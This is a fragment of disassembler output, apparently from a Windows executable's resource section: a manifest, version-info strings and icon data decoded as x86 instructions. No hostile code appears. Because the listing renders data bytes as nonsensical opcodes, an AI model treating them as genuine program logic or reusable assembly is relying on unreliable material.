  409619:	outs   dx,BYTE PTR ds:[esi]
  40961a:	outs   dx,DWORD PTR fs:[esi]
  40961c:	ja     0x409691
  40961e:	push   ebx
  40961f:	gs je  0x409696
  409622:	imul   ebp,DWORD PTR [esi+0x67],0x6d782073
  409629:	ins    BYTE PTR es:[edi],dx
  40962a:	outs   dx,BYTE PTR ds:[esi]
  40962b:	jae    0x40966a
  40962d:	and    ch,BYTE PTR [eax+0x74]
  409630:	je     0x4096a2
  409632:	cmp    ch,BYTE PTR [edi]
  409634:	das    
  409635:	jae    0x40969a
  409637:	push   0x73616d65
  40963c:	cs ins DWORD PTR es:[edi],dx
  40963e:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  409645:	je     0x409675
  409647:	arpl   WORD PTR [edi+0x6d],bp
  40964a:	das    
  40964b:	push   ebx
  40964c:	dec    ebp
  40964d:	dec    ecx
  40964e:	das    
  40964f:	xor    dh,BYTE PTR [eax]
  409651:	xor    BYTE PTR ds:0x6e69572f,dh
  409657:	outs   dx,DWORD PTR fs:[esi]
  409659:	ja     0x4096ce
  40965b:	push   ebx
  40965c:	gs je  0x4096d3
  40965f:	imul   ebp,DWORD PTR [esi+0x67],0xd3e2273
  409666:	or     ah,BYTE PTR [eax]
  409668:	and    BYTE PTR [eax],ah
  40966a:	and    BYTE PTR [eax],ah
  40966c:	and    BYTE PTR [esp+eiz*2],bh
  40966f:	jo     0x4096da
  409671:	inc    ecx
  409672:	ja     0x4096d5
  409674:	jb     0x4096db
  409676:	ds je  0x4096eb
  409679:	jne    0x4096e0
  40967b:	cmp    al,0x2f
  40967d:	fs jo  0x4096e9
  409680:	inc    ecx
  409681:	ja     0x4096e4
  409683:	jb     0x4096ea
  409685:	ds or  eax,0x2020200a
  40968b:	and    BYTE PTR [edi+ebp*1],bh
  40968e:	popa   
  40968f:	jae    0x4096fe
  409691:	jbe    0x4096c6
  409693:	cmp    dh,BYTE PTR [edi+0x69]
  409696:	outs   dx,BYTE PTR ds:[esi]
  409697:	outs   dx,DWORD PTR fs:[esi]
  409699:	ja     0x40970e
  40969b:	push   ebx
  40969c:	gs je  0x409713
  40969f:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  4096a6:	and    BYTE PTR [eax],ah
  4096a8:	cmp    al,0x2f
  4096aa:	popa   
  4096ab:	jae    0x40971a
  4096ad:	jbe    0x4096e2
  4096af:	cmp    ah,BYTE PTR [ecx+0x70]
  4096b2:	jo     0x409720
  4096b4:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4096bb:	ds or  eax,0x200a0d0a
  4096c1:	and    BYTE PTR [esp+esi*2],bh
  4096c4:	jb     0x40973b
  4096c6:	jae    0x40973c
  4096c8:	dec    ecx
  4096c9:	outs   dx,BYTE PTR ds:[esi]
  4096ca:	outs   dx,WORD PTR ds:[esi]
  4096cc:	and    BYTE PTR [eax+0x6d],bh
  4096cf:	ins    BYTE PTR es:[edi],dx
  4096d0:	outs   dx,BYTE PTR ds:[esi]
  4096d1:	jae    0x409710
  4096d3:	and    dh,BYTE PTR [ebp+0x72]
  4096d6:	outs   dx,BYTE PTR ds:[esi]
  4096d7:	cmp    dh,BYTE PTR [ebx+0x63]
  4096da:	push   0x73616d65
  4096df:	sub    eax,0x7263696d
  4096e4:	outs   dx,DWORD PTR ds:[esi]
  4096e5:	jae    0x409756
  4096e7:	data16 je 0x409717
  4096ea:	arpl   WORD PTR [edi+0x6d],bp
  4096ed:	cmp    ah,BYTE PTR [ecx+0x73]
  4096f0:	ins    DWORD PTR es:[edi],dx
  4096f1:	cs jbe 0x409727
  4096f4:	and    bh,BYTE PTR [esi]
  4096f6:	or     eax,0x2020200a
  4096fb:	and    BYTE PTR [ebx+esi*2],bh
  4096fe:	arpl   WORD PTR gs:[ebp+0x72],si
  409702:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40970a:	and    BYTE PTR [eax],ah
  40970c:	and    BYTE PTR [eax],ah
  40970e:	cmp    al,0x72
  409710:	gs jno 0x409788
  409713:	gs jae 0x40978a
  409716:	gs fs push eax
  409719:	jb     0x409784
  40971b:	jbe    0x409786
  40971d:	ins    BYTE PTR es:[edi],dx
  40971e:	gs addr16 gs jae 0x409761
  409723:	or     eax,0x2020200a
  409728:	and    BYTE PTR [eax],ah
  40972a:	and    BYTE PTR [eax],ah
  40972c:	and    BYTE PTR [edx+esi*2],bh
  40972f:	gs jno 0x4097a7
  409732:	gs jae 0x4097a9
  409735:	gs fs inc ebp
  409738:	js     0x40979f
  40973a:	arpl   WORD PTR [ebp+0x74],si
  40973d:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  409744:	ins    BYTE PTR es:[edi],dx
  409745:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  409749:	gs ins BYTE PTR es:[edi],dx
  40974b:	cmp    eax,0x49736122
  409750:	outs   dx,BYTE PTR ds:[esi]
  409751:	jbe    0x4097c2
  409753:	imul   esp,DWORD PTR [ebp+0x72],0x22
  409757:	das    
  409758:	ds or  eax,0x2020200a
  40975e:	and    BYTE PTR [eax],ah
  409760:	and    BYTE PTR [edi+ebp*1],bh
  409763:	jb     0x4097ca
  409765:	jno    0x4097dc
  409767:	gs jae 0x4097de
  40976a:	gs fs push eax
  40976d:	jb     0x4097d8
  40976f:	jbe    0x4097da
  409771:	ins    BYTE PTR es:[edi],dx
  409772:	gs addr16 gs jae 0x4097b5
  409777:	or     eax,0x2020200a
  40977c:	and    BYTE PTR [edi+ebp*1],bh
  40977f:	jae    0x4097e6
  409781:	arpl   WORD PTR [ebp+0x72],si
  409784:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40978c:	cmp    al,0x2f
  40978e:	je     0x409802
  409790:	jne    0x409805
  409792:	je     0x4097dd
  409794:	outs   dx,BYTE PTR ds:[esi]
  409795:	outs   dx,WORD PTR ds:[esi]
  409797:	ds or  eax,0x3c0a0d0a
  40979d:	das    
  40979e:	popa   
  40979f:	jae    0x409814
  4097a1:	gs ins DWORD PTR es:[edi],dx
  4097a3:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4097a7:	or     eax,0xa
  4097ac:	add    BYTE PTR [eax],al
  4097ae:	add    BYTE PTR [eax],al
  4097b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097b1:	add    esi,DWORD PTR [eax+eax*1]
  4097b4:	add    BYTE PTR [eax],al
  4097b6:	push   esi
  4097b7:	add    BYTE PTR [ebx+0x0],dl
  4097ba:	pop    edi
  4097bb:	add    BYTE PTR [esi+0x0],dl
  4097be:	inc    ebp
  4097bf:	add    BYTE PTR [edx+0x0],dl
  4097c2:	push   ebx
  4097c3:	add    BYTE PTR [ecx+0x0],cl
  4097c6:	dec    edi
  4097c7:	add    BYTE PTR [esi+0x0],cl
  4097ca:	pop    edi
  4097cb:	add    BYTE PTR [ecx+0x0],cl
  4097ce:	dec    esi
  4097cf:	add    BYTE PTR [esi+0x0],al
  4097d2:	dec    edi
  4097d3:	add    BYTE PTR [eax],al
  4097d5:	add    BYTE PTR [eax],al
  4097d7:	add    BYTE PTR [ebp+0xfeef04],bh
  4097dd:	add    BYTE PTR [ecx],al
  4097df:	add    BYTE PTR [eax],al
  4097e1:	add    BYTE PTR [edx],cl
  4097e3:	add    BYTE PTR [eax],al
  4097e5:	inc    eax
  4097e6:	add    BYTE PTR [eax],ch
  4097e8:	add    BYTE PTR [eax],al
  4097ea:	or     al,BYTE PTR [eax]
  4097ec:	add    BYTE PTR [eax+0x0],al
  4097ef:	sub    BYTE PTR [edi],bh
  4097f1:	add    BYTE PTR [eax],al
  4097f3:	add    BYTE PTR [eax],al
  4097f5:	add    BYTE PTR [eax],al
  4097f7:	add    BYTE PTR [eax+eax*1],al
  4097fa:	add    al,0x0
  4097fc:	add    DWORD PTR [eax],eax
	...
  40980a:	add    BYTE PTR [eax],al
  40980c:	add    al,BYTE PTR [ebx]
  40980e:	add    BYTE PTR [eax],al
  409810:	add    DWORD PTR [eax],eax
  409812:	push   ebx
  409813:	add    BYTE PTR [eax+eax*1+0x72],dh
  409817:	add    BYTE PTR [ecx+0x0],ch
  40981a:	outs   dx,BYTE PTR ds:[esi]
  40981b:	add    BYTE PTR [edi+0x0],ah
  40981e:	inc    esi
  40981f:	add    BYTE PTR [ecx+0x0],ch
  409822:	ins    BYTE PTR es:[edi],dx
  409823:	add    BYTE PTR [ebp+0x0],ah
  409826:	dec    ecx
  409827:	add    BYTE PTR [esi+0x0],ch
  40982a:	data16 add BYTE PTR [edi+0x0],ch
  40982e:	add    BYTE PTR [eax],al
  409830:	fiadd  WORD PTR [edx]
  409832:	add    BYTE PTR [eax],al
  409834:	add    DWORD PTR [eax],eax
  409836:	xor    BYTE PTR [eax],al
  409838:	xor    al,0x0
  40983a:	xor    BYTE PTR [eax],al
  40983c:	cmp    DWORD PTR [eax],eax
  40983e:	xor    BYTE PTR [eax],al
  409840:	xor    al,0x0
  409842:	inc    edx
  409843:	add    BYTE PTR [eax],dh
  409845:	add    BYTE PTR [eax],al
  409847:	add    BYTE PTR [eax+eax*1+0x16],cl
  40984b:	add    BYTE PTR [ecx],al
  40984d:	add    BYTE PTR [ebx+0x0],al
  409850:	outs   dx,DWORD PTR ds:[esi]
  409851:	add    BYTE PTR [ebp+0x0],ch
  409854:	jo     0x409856
  409856:	popa   
  409857:	add    BYTE PTR [esi+0x0],ch
  40985a:	jns    0x40985c
  40985c:	dec    esi
  40985d:	add    BYTE PTR [ecx+0x0],ah
  409860:	ins    DWORD PTR es:[edi],dx
  409861:	add    BYTE PTR [ebp+0x0],ah
  409864:	add    BYTE PTR [eax],al
  409866:	add    BYTE PTR [eax],al
  409868:	dec    ebp
  409869:	add    BYTE PTR [ecx+0x0],ch
  40986c:	arpl   WORD PTR [eax],ax
  40986e:	jb     0x409870
  409870:	outs   dx,DWORD PTR ds:[esi]
  409871:	add    BYTE PTR [ebx+0x0],dh
  409874:	outs   dx,DWORD PTR ds:[esi]
  409875:	add    BYTE PTR [esi+0x0],ah
  409878:	je     0x40987a
  40987a:	and    BYTE PTR [eax],al
  40987c:	inc    ebx
  40987d:	add    BYTE PTR [edi+0x0],ch
  409880:	jb     0x409882
  409882:	jo     0x409884
  409884:	outs   dx,DWORD PTR ds:[esi]
  409885:	add    BYTE PTR [edx+0x0],dh
  409888:	popa   
  409889:	add    BYTE PTR [eax+eax*1+0x69],dh
  40988d:	add    BYTE PTR [edi+0x0],ch
  409890:	outs   dx,BYTE PTR ds:[esi]
  409891:	add    BYTE PTR [eax],al
  409893:	add    BYTE PTR [eax+0x0],ch
  409896:	and    BYTE PTR [eax],al
  409898:	add    DWORD PTR [eax],eax
  40989a:	inc    esi
  40989b:	add    BYTE PTR [ecx+0x0],ch
  40989e:	ins    BYTE PTR es:[edi],dx
  40989f:	add    BYTE PTR [ebp+0x0],ah
  4098a2:	inc    esp
  4098a3:	add    BYTE PTR [ebp+0x0],ah
  4098a6:	jae    0x4098a8
  4098a8:	arpl   WORD PTR [eax],ax
  4098aa:	jb     0x4098ac
  4098ac:	imul   eax,DWORD PTR [eax],0x740070
  4098b2:	imul   eax,DWORD PTR [eax],0x6e006f
  4098b8:	add    BYTE PTR [eax],al
  4098ba:	add    BYTE PTR [eax],al
  4098bc:	inc    ebp
  4098bd:	add    BYTE PTR [eax+0x0],bh
  4098c0:	je     0x4098c2
  4098c2:	add    BYTE PTR gs:[esi+0x0],ch
  4098c6:	jae    0x4098c8
  4098c8:	imul   eax,DWORD PTR [eax],0x6c0062
  4098ce:	add    BYTE PTR gs:[eax],ah
  4098d1:	add    BYTE PTR [edi+0x0],dl
  4098d4:	imul   eax,DWORD PTR [eax],0x61007a
  4098da:	jb     0x4098dc
  4098dc:	add    BYTE PTR fs:[ebx+0x0],dh
  4098e0:	and    BYTE PTR [eax],al
  4098e2:	dec    eax
  4098e3:	add    BYTE PTR [edi+0x0],ch
  4098e6:	jae    0x4098e8
  4098e8:	je     0x4098ea
  4098ea:	and    BYTE PTR [eax],al
  4098ec:	push   eax
  4098ed:	add    BYTE PTR [edx+0x0],dh
  4098f0:	outs   dx,DWORD PTR ds:[esi]
  4098f1:	add    BYTE PTR [ebx+0x0],ah
  4098f4:	add    BYTE PTR gs:[ebx+0x0],dh
  4098f8:	jae    0x4098fa
  4098fa:	add    BYTE PTR [eax],al
  4098fc:	data16 add BYTE PTR [ebx],ah
  4098ff:	add    BYTE PTR [ecx],al
  409901:	add    BYTE PTR [esi+0x0],al
  409904:	imul   eax,DWORD PTR [eax],0x65006c
  40990a:	push   esi
  40990b:	add    BYTE PTR [ebp+0x0],ah
  40990e:	jb     0x409910
  409910:	jae    0x409912
  409912:	imul   eax,DWORD PTR [eax],0x6e006f
  409918:	add    BYTE PTR [eax],al
  40991a:	add    BYTE PTR [eax],al
  40991c:	xor    DWORD PTR [eax],eax
  40991e:	xor    BYTE PTR [eax],al
  409920:	add    BYTE PTR cs:[eax],dh
  409923:	add    BYTE PTR [esi],ch
  409925:	add    BYTE PTR [ecx],dh
  409927:	add    BYTE PTR [eax],dh
  409929:	add    BYTE PTR [edx],dh
  40992b:	add    BYTE PTR [eax+eax*1],dh
  40992e:	xor    BYTE PTR [eax],al
  409930:	add    BYTE PTR cs:[ecx],dh
  409933:	add    BYTE PTR [esi],dh
  409935:	add    BYTE PTR [ebx],dh
  409937:	add    BYTE PTR [eax],bh
  409939:	add    BYTE PTR [eax+eax*1],dh
  40993c:	and    BYTE PTR [eax],al
  40993e:	sub    BYTE PTR [eax],al
  409940:	je     0x409942
  409942:	push   0x2e003100
  409947:	add    BYTE PTR [ecx],dh
  409949:	add    BYTE PTR ds:0x37003000,dh
  40994f:	add    BYTE PTR [eax],dh
  409951:	add    BYTE PTR [ecx],bh
  409953:	add    BYTE PTR ds:0x37003100,ch
  409959:	add    BYTE PTR [eax],dh
  40995b:	add    BYTE PTR [eax],dh
  40995d:	add    BYTE PTR [ecx],ch
  40995f:	add    BYTE PTR [eax],al
  409961:	add    BYTE PTR [eax],al
  409963:	add    BYTE PTR [eax],bh
  409965:	add    BYTE PTR [eax+eax*1],cl
  409968:	add    DWORD PTR [eax],eax
  40996a:	dec    ecx
  40996b:	add    BYTE PTR [esi+0x0],ch
  40996e:	je     0x409970
  409970:	add    BYTE PTR gs:[edx+0x0],dh
  409974:	outs   dx,BYTE PTR ds:[esi]
  409975:	add    BYTE PTR [ecx+0x0],ah
  409978:	ins    BYTE PTR es:[edi],dx
  409979:	add    BYTE PTR [esi+0x0],cl
  40997c:	popa   
  40997d:	add    BYTE PTR [ebp+0x0],ch
  409980:	add    BYTE PTR gs:[eax],al
  409983:	add    BYTE PTR [eax+0x0],bh
  409986:	ja     0x409988
  409988:	imul   eax,DWORD PTR [eax],0x61007a
  40998e:	jb     0x409990
  409990:	add    BYTE PTR fs:[esi],ch
  409993:	add    BYTE PTR [ebp+0x0],ah
  409996:	js     0x409998
  409998:	add    BYTE PTR gs:[eax],al
  40999b:	add    BYTE PTR [eax+0x1002e00],al
  4099a1:	add    BYTE PTR [eax+eax*1+0x65],cl
  4099a5:	add    BYTE PTR [edi+0x0],ah
  4099a8:	popa   
  4099a9:	add    BYTE PTR [eax+eax*1+0x43],ch
  4099ad:	add    BYTE PTR [edi+0x0],ch
  4099b0:	jo     0x4099b2
  4099b2:	jns    0x4099b4
  4099b4:	jb     0x4099b6
  4099b6:	imul   eax,DWORD PTR [eax],0x680067
  4099bc:	je     0x4099be
  4099be:	add    BYTE PTR [eax],al
  4099c0:	test   eax,0x4d002000
  4099c5:	add    BYTE PTR [ecx+0x0],ch
  4099c8:	arpl   WORD PTR [eax],ax
  4099ca:	jb     0x4099cc
  4099cc:	outs   dx,DWORD PTR ds:[esi]
  4099cd:	add    BYTE PTR [ebx+0x0],dh
  4099d0:	outs   dx,DWORD PTR ds:[esi]
  4099d1:	add    BYTE PTR [esi+0x0],ah
  4099d4:	je     0x4099d6
  4099d6:	and    BYTE PTR [eax],al
  4099d8:	inc    ebx
  4099d9:	add    BYTE PTR [edi+0x0],ch
  4099dc:	jb     0x4099de
  4099de:	jo     0x4099e0
  4099e0:	outs   dx,DWORD PTR ds:[esi]
  4099e1:	add    BYTE PTR [edx+0x0],dh
  4099e4:	popa   
  4099e5:	add    BYTE PTR [eax+eax*1+0x69],dh
  4099e9:	add    BYTE PTR [edi+0x0],ch
  4099ec:	outs   dx,BYTE PTR ds:[esi]
  4099ed:	add    BYTE PTR [esi],ch
  4099ef:	add    BYTE PTR [eax],ah
  4099f1:	add    BYTE PTR [ecx+0x0],al
  4099f4:	ins    BYTE PTR es:[edi],dx
  4099f5:	add    BYTE PTR [eax+eax*1+0x20],ch
  4099f9:	add    BYTE PTR [edx+0x0],dh
  4099fc:	imul   eax,DWORD PTR [eax],0x680067
  409a02:	je     0x409a04
  409a04:	jae    0x409a06
  409a06:	and    BYTE PTR [eax],al
  409a08:	jb     0x409a0a
  409a0a:	add    BYTE PTR gs:[ebx+0x0],dh
  409a0e:	add    BYTE PTR gs:[edx+0x0],dh
  409a12:	jbe    0x409a14
  409a14:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  409a19:	add    BYTE PTR [eax],al
  409a1b:	add    BYTE PTR [eax+0x0],al
  409a1e:	or     al,0x0
  409a20:	add    DWORD PTR [eax],eax
  409a22:	dec    edi
  409a23:	add    BYTE PTR [edx+0x0],dh
  409a26:	imul   eax,DWORD PTR [eax],0x690067
  409a2c:	outs   dx,BYTE PTR ds:[esi]
  409a2d:	add    BYTE PTR [ecx+0x0],ah
  409a30:	ins    BYTE PTR es:[edi],dx
  409a31:	add    BYTE PTR [esi+0x0],al
  409a34:	imul   eax,DWORD PTR [eax],0x65006c
  409a3a:	outs   dx,BYTE PTR ds:[esi]
  409a3b:	add    BYTE PTR [ecx+0x0],ah
  409a3e:	ins    DWORD PTR es:[edi],dx
  409a3f:	add    BYTE PTR [ebp+0x0],ah
  409a42:	add    BYTE PTR [eax],al
  409a44:	js     0x409a46
  409a46:	ja     0x409a48
  409a48:	imul   eax,DWORD PTR [eax],0x61007a
  409a4e:	jb     0x409a50
  409a50:	add    BYTE PTR fs:[esi],ch
  409a53:	add    BYTE PTR [ebp+0x0],ah
  409a56:	js     0x409a58
  409a58:	add    BYTE PTR gs:[eax],al
  409a5b:	add    BYTE PTR [edx+0x0],ch
  409a5e:	and    eax,0x50000100
  409a63:	add    BYTE PTR [edx+0x0],dh
  409a66:	outs   dx,DWORD PTR ds:[esi]
  409a67:	add    BYTE PTR [eax+eax*1+0x75],ah
  409a6b:	add    BYTE PTR [ebx+0x0],ah
  409a6e:	je     0x409a70
  409a70:	dec    esi
  409a71:	add    BYTE PTR [ecx+0x0],ah
  409a74:	ins    DWORD PTR es:[edi],dx
  409a75:	add    BYTE PTR [ebp+0x0],ah
  409a78:	add    BYTE PTR [eax],al
  409a7a:	add    BYTE PTR [eax],al
  409a7c:	dec    ebp
  409a7d:	add    BYTE PTR [ecx+0x0],ch
  409a80:	arpl   WORD PTR [eax],ax
  409a82:	jb     0x409a84
  409a84:	outs   dx,DWORD PTR ds:[esi]
  409a85:	add    BYTE PTR [ebx+0x0],dh
  409a88:	outs   dx,DWORD PTR ds:[esi]
  409a89:	add    BYTE PTR [esi+0x0],ah
  409a8c:	je     0x409a8e
  409a8e:	scas   al,BYTE PTR es:[edi]
  409a8f:	add    BYTE PTR [eax],ah
  409a91:	add    BYTE PTR [edi+0x0],dl
  409a94:	imul   eax,DWORD PTR [eax],0x64006e
  409a9a:	outs   dx,DWORD PTR ds:[esi]
  409a9b:	add    BYTE PTR [edi+0x0],dh
  409a9e:	jae    0x409aa0
  409aa0:	scas   al,BYTE PTR es:[edi]
  409aa1:	add    BYTE PTR [eax],ah
  409aa3:	add    BYTE PTR [edi+0x0],cl
  409aa6:	jo     0x409aa8
  409aa8:	add    BYTE PTR gs:[edx+0x0],dh
  409aac:	popa   
  409aad:	add    BYTE PTR [eax+eax*1+0x69],dh
  409ab1:	add    BYTE PTR [esi+0x0],ch
  409ab4:	add    BYTE PTR [bx+si],ah
  409ab7:	add    BYTE PTR [ebx+0x0],dl
  409aba:	jns    0x409abc
  409abc:	jae    0x409abe
  409abe:	je     0x409ac0
  409ac0:	add    BYTE PTR gs:[ebp+0x0],ch
  409ac4:	add    BYTE PTR [eax],al
  409ac6:	add    BYTE PTR [eax],al
  409ac8:	inc    esi
  409ac9:	add    BYTE PTR [ecx],dl
  409acb:	add    BYTE PTR [ecx],al
  409acd:	add    BYTE PTR [eax+0x0],dl
  409ad0:	jb     0x409ad2
  409ad2:	outs   dx,DWORD PTR ds:[esi]
  409ad3:	add    BYTE PTR [eax+eax*1+0x75],ah
  409ad7:	add    BYTE PTR [ebx+0x0],ah
  409ada:	je     0x409adc
  409adc:	push   esi
  409add:	add    BYTE PTR [ebp+0x0],ah
  409ae0:	jb     0x409ae2
  409ae2:	jae    0x409ae4
  409ae4:	imul   eax,DWORD PTR [eax],0x6e006f
  409aea:	add    BYTE PTR [eax],al
  409aec:	xor    DWORD PTR [eax],eax
  409aee:	xor    BYTE PTR [eax],al
  409af0:	add    BYTE PTR cs:[eax],dh
  409af3:	add    BYTE PTR [esi],ch
  409af5:	add    BYTE PTR [ecx],dh
  409af7:	add    BYTE PTR [eax],dh
  409af9:	add    BYTE PTR [edx],dh
  409afb:	add    BYTE PTR [eax+eax*1],dh
  409afe:	xor    BYTE PTR [eax],al
  409b00:	add    BYTE PTR cs:[ecx],dh
  409b03:	add    BYTE PTR [esi],dh
  409b05:	add    BYTE PTR [ebx],dh
  409b07:	add    BYTE PTR [eax],bh
  409b09:	add    BYTE PTR [eax+eax*1],dh
  409b0c:	add    BYTE PTR [eax],al
  409b0e:	add    BYTE PTR [eax],al
  409b10:	inc    esp
  409b11:	add    BYTE PTR [eax],al
  409b13:	add    BYTE PTR [ecx],al
  409b15:	add    BYTE PTR [esi+0x0],dl
  409b18:	popa   
  409b19:	add    BYTE PTR [edx+0x0],dh
  409b1c:	inc    esi
  409b1d:	add    BYTE PTR [ecx+0x0],ch
  409b20:	ins    BYTE PTR es:[edi],dx
  409b21:	add    BYTE PTR [ebp+0x0],ah
  409b24:	dec    ecx
  409b25:	add    BYTE PTR [esi+0x0],ch
  409b28:	data16 add BYTE PTR [edi+0x0],ch
  409b2c:	add    BYTE PTR [eax],al
  409b2e:	add    BYTE PTR [eax],al
  409b30:	and    al,0x0
  409b32:	add    al,0x0
  409b34:	add    BYTE PTR [eax],al
  409b36:	push   esp
  409b37:	add    BYTE PTR [edx+0x0],dh
  409b3a:	popa   
  409b3b:	add    BYTE PTR [esi+0x0],ch
  409b3e:	jae    0x409b40
  409b40:	ins    BYTE PTR es:[edi],dx
  409b41:	add    BYTE PTR [ecx+0x0],ah
  409b44:	je     0x409b46
  409b46:	imul   eax,DWORD PTR [eax],0x6e006f
  409b4c:	add    BYTE PTR [eax],al
  409b4e:	add    BYTE PTR [eax],al
  409b50:	or     DWORD PTR [eax+esi*4],eax
  409b53:	add    al,0x0
  409b55:	add    BYTE PTR [eax],al
  409b57:	add    BYTE PTR [eax],ch
  409b59:	add    BYTE PTR [eax],al
  409b5b:	add    BYTE PTR [eax],dh
  409b5d:	add    BYTE PTR [eax],al
  409b5f:	add    BYTE PTR [eax+0x0],ah
  409b62:	add    BYTE PTR [eax],al
  409b64:	add    DWORD PTR [eax],eax
  409b66:	add    al,0x0
	...
  409b84:	add    BYTE PTR [eax],al
  409b86:	add    BYTE PTR [eax],0x0
  409b89:	add    BYTE PTR [eax],0x0
  409b8c:	add    BYTE PTR [eax+0x800080],al
  409b92:	add    BYTE PTR [eax],al
  409b94:	add    BYTE PTR [eax],0x80
  409b97:	add    BYTE PTR [eax-0x3fffff80],al
  409b9d:	rol    al,0x0
  409ba0:	add    BYTE PTR [eax+0x80],0xff
  409ba7:	add    BYTE PTR [eax],al
  409ba9:	inc    DWORD PTR [eax]
  409bab:	add    BYTE PTR [eax],al
  409bad:	(bad)  
  409bae:	inc    DWORD PTR [eax]
  409bb0:	inc    DWORD PTR [eax]
  409bb2:	add    BYTE PTR [eax],al
  409bb4:	inc    DWORD PTR [eax]
  409bb6:	inc    DWORD PTR [eax]
  409bb8:	(bad)  
  409bb9:	inc    DWORD PTR [eax]
  409bbb:	add    bh,bh
  409bbd:	(bad)  
  409bbe:	inc    DWORD PTR [eax]
  409bc0:	add    BYTE PTR [eax],al
  409bc2:	add    BYTE PTR [eax],dl
  409bc4:	adc    BYTE PTR [eax],dl
  409bc6:	adc    BYTE PTR [eax],dl
  409bc8:	adc    BYTE PTR [eax],dl
  409bca:	adc    BYTE PTR [eax],dl
  409bcc:	adc    BYTE PTR [eax],dl
  409bce:	adc    BYTE PTR [eax],dl
  409bd0:	adc    BYTE PTR [eax],dl
  409bd2:	adc    BYTE PTR [eax],dl
  409bd4:	adc    BYTE PTR [eax],dl
  409bd6:	adc    BYTE PTR [eax],dl
  409bd8:	adc    BYTE PTR [eax],dl
  409bda:	adc    BYTE PTR [eax],dl
  409bdc:	adc    BYTE PTR [eax],dl
  409bde:	adc    BYTE PTR [eax],dl
  409be0:	adc    BYTE PTR [eax],dl
  409be2:	adc    BYTE PTR [eax],dl
  409be4:	adc    BYTE PTR [eax],dl
  409be6:	adc    BYTE PTR [eax],dl
  409be8:	adc    BYTE PTR [eax],dl
  409bea:	adc    BYTE PTR [eax],dl
  409bec:	adc    BYTE PTR [eax],dl
  409bee:	adc    BYTE PTR [eax],dl
  409bf0:	adc    BYTE PTR [eax],dl
  409bf2:	adc    BYTE PTR [eax],dl
  409bf4:	adc    BYTE PTR [eax],dl
	...
  409c06:	add    BYTE PTR [eax],al
  409c08:	adc    BYTE PTR [eax],dl
  409c0a:	adc    BYTE PTR [eax],dl
  409c0c:	adc    BYTE PTR [eax],dl
  409c0e:	xchg   DWORD PTR [edi+0x77],esi
  409c11:	ja     0x409c8a
  409c13:	ja     0x409c8c
  409c15:	ja     0x409c8e
  409c17:	ja     0x409c90
  409c19:	ja     0x409c92
  409c1b:	ja     0x409c94
  409c1d:	ja     0x409c96
  409c1f:	jo     0x409c31
  409c21:	adc    BYTE PTR [eax],dl
  409c23:	adc    BYTE PTR [eax],dl
  409c25:	adc    BYTE PTR [edi-0x1],al
  409c2b:	(bad)  
  409c2c:	(bad)  
  409c2d:	(bad)  
  409c2e:	(bad)  
  409c2f:	(bad)  
  409c30:	(bad)  
  409c31:	(bad)  
  409c32:	(bad)  
  409c33:	(bad)  
  409c34:	(bad)  
  409c35:	(bad)  
  409c36:	push   eax
  409c38:	adc    BYTE PTR [eax],dl
  409c3a:	adc    BYTE PTR [eax],dl
  409c3c:	adc    BYTE PTR [eax],dl
  409c3e:	xchg   edi,edi
  409c40:	(bad)  
  409c41:	(bad)  
  409c42:	(bad)  
  409c43:	(bad)  
  409c44:	(bad)  
  409c45:	(bad)  
  409c46:	(bad)  
  409c47:	(bad)  
  409c48:	(bad)  
  409c49:	(bad)  
  409c4a:	(bad)  
  409c4b:	(bad)  
  409c4c:	(bad)  
  409c4d:	(bad)  
  409c4e:	push   eax
  409c50:	adc    BYTE PTR [eax],dl
  409c52:	adc    BYTE PTR [eax],dl
  409c54:	adc    BYTE PTR [eax],dl
  409c56:	xchg   edi,edi
  409c58:	div    DWORD PTR [edi+0x77]
  409c5b:	(bad)  
  409c5c:	(bad)  
  409c5d:	push   DWORD PTR [edi+0x77]
  409c60:	jg     0x409c61
  409c62:	push   DWORD PTR [edi+0x77]
  409c65:	jg     0x409c66
  409c67:	lock adc BYTE PTR [eax],dl
  409c6a:	adc    BYTE PTR [eax],dl
  409c6c:	adc    BYTE PTR [eax],dl
  409c6e:	xchg   edi,edi
  409c70:	clc    
  409c71:	mov    BYTE PTR [eax-0x77000001],cl
  409c77:	mov    BYTE PTR [edi-0x77770001],cl
  409c7d:	(bad)  
  409c7e:	push   eax
  409c80:	adc    BYTE PTR [eax],dl
  409c82:	adc    BYTE PTR [eax],dl
  409c84:	adc    BYTE PTR [eax],dl
  409c86:	xchg   edi,edi
  409c88:	(bad)  
  409c89:	(bad)  
  409c8a:	(bad)  
  409c8b:	(bad)  
  409c8c:	(bad)  
  409c8d:	(bad)  
  409c8e:	(bad)  
  409c8f:	(bad)  
  409c90:	(bad)  
  409c91:	(bad)  
  409c92:	(bad)  
  409c93:	(bad)  
  409c94:	(bad)  
  409c95:	(bad)  
  409c96:	push   eax
  409c98:	adc    BYTE PTR [eax],dl
  409c9a:	adc    BYTE PTR [eax],dl
  409c9c:	adc    BYTE PTR [eax],dl
  409c9e:	xchg   edi,edi
  409ca0:	(bad)  
  409ca1:	(bad)  
  409ca2:	(bad)  
  409ca3:	(bad)  
  409ca4:	(bad)  
  409ca5:	(bad)  
  409ca6:	(bad)  
  409ca7:	(bad)  
  409ca8:	(bad)  
  409ca9:	(bad)  
  409caa:	(bad)  
  409cab:	(bad)  
  409cac:	(bad)  
  409cad:	(bad)  
  409cae:	push   eax
  409cb0:	adc    BYTE PTR [eax],dl
  409cb2:	adc    BYTE PTR [eax],dl
  409cb4:	adc    BYTE PTR [eax],dl
  409cb6:	xchg   edi,edi
  409cb8:	inc    DWORD PTR [eax]
  409cba:	add    bh,bh
  409cbc:	(bad)  
  409cbd:	push   eax
  409cbf:	add    BYTE PTR [edi],cl
  409cc1:	(bad)  
  409cc2:	push   eax
  409cc4:	add    BYTE PTR [edi],cl
  409cc6:	push   eax
  409cc8:	adc    BYTE PTR [eax],dl
  409cca:	adc    BYTE PTR [eax],dl
  409ccc:	adc    BYTE PTR [eax],dl
  409cce:	xchg   edi,edi
  409cd0:	cmc    
  409cd1:	push   ebp
  409cd2:	push   ebp
